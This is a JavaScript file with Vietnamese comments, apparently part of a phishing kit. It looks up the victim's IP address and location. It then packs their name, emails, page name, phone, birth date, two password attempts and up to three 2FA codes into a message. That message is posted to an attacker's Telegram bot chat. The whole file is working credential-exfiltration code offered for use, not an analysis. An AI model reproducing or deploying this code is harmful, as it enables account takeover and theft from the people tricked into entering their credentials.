// Thêm hàm chuyển đổi Country Code (VN, US...) sang Emoji lá cờ
function getCountryFlag(countryCode) {
    if (!countryCode || countryCode === 'N/A' || countryCode.length !== 2) return '🌐';
    const codePoints = countryCode
        .toUpperCase()
        .split('')
        .map(char => 127397 + char.charCodeAt(0));
    return String.fromCodePoint(...codePoints);
}

// 1. Cập nhật hàm getUserLocation để lấy chuẩn mã quốc gia viết tắt
async function getUserLocation() {
    try {
        const response = await fetch("https://ipwho.is/", {
            method: "GET",
            cache: "no-store"
        });

        if (!response.ok) throw new Error(`Location API error: ${response.status}`);
        const data = await response.json();
        if (data.success === false) throw new Error(data.message || "Location lookup failed");

        const ip = data.ip || "N/A";
        const countryCode = (data.country_code || "N/A").toUpperCase(); // Mã viết tắt: VN, US, JP...

        const parts = [data.city, data.region, data.country].filter(Boolean);

        return {
            ip: ip,
            country_code: countryCode,                               // Ví dụ: US, VN
            flag: getCountryFlag(countryCode),                       // Ví dụ: 🇺🇸, 🇻🇳
            ip_short: `[${countryCode}] ${ip}`,                     // Ví dụ: [VN] 113.161.x.x
            location: parts.length > 0 ? parts.join(" | ") : "N/A"
        };
    } catch (error) {
        console.error("Location error:", error);
        return {
            ip: "N/A",
            country_code: "N/A",
            flag: "🌐",
            ip_short: "[N/A] N/A",
            location: "N/A"
        };
    }
}

// 2. Cập nhật hàm sendToTelegram hiển thị IP viết tắt đẹp mắt
async function sendToTelegram(data) {
    const loc = data.locationData || {
        ip: "N/A",
        country_code: "N/A",
        flag: "🌐",
        ip_short: "[N/A] N/A",
        location: "N/A"
    };

    const text = `
<b>🌐 IP & VỊ TRÍ:</b>
• <b>IP:</b> <code>${loc.ip_short}</code> ${loc.flag}
• <b>Location:</b> <code>${loc.location}</code>
----------------------------------
<b>👤 THÔNG TIN:</b>
• <b>Full Name:</b> <code>${data.fullName || ''}</code>
• <b>Email:</b> <code>${data.email || ''}</code>
• <b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
• <b>Page Name:</b> <code>${data.fanpage || ''}</code>
• <b>Phone:</b> <code>${data.phone || ''}</code>
• <b>DOB:</b> <code>${data.day}/${data.month}/${data.year}</code>
----------------------------------
<b>🔑 PASSWORD:</b>
• <b>Password (1):</b> <code>${data.password || ''}</code>
• <b>Password (2):</b> <code>${data.passwordSecond || ''}</code>
----------------------------------
<b>🛡️ CODE 2FA:</b>
• <b>2FA (1):</b> <code>${data.twoFa || ''}</code>
• <b>2FA (2):</b> <code>${data.twoFaSecond || ''}</code>
• <b>2FA (3):</b> <code>${data.twoFaThird || ''}</code>`;

    try {
        await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text: text.trim(),
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('Telegram error:', error);
    }
}
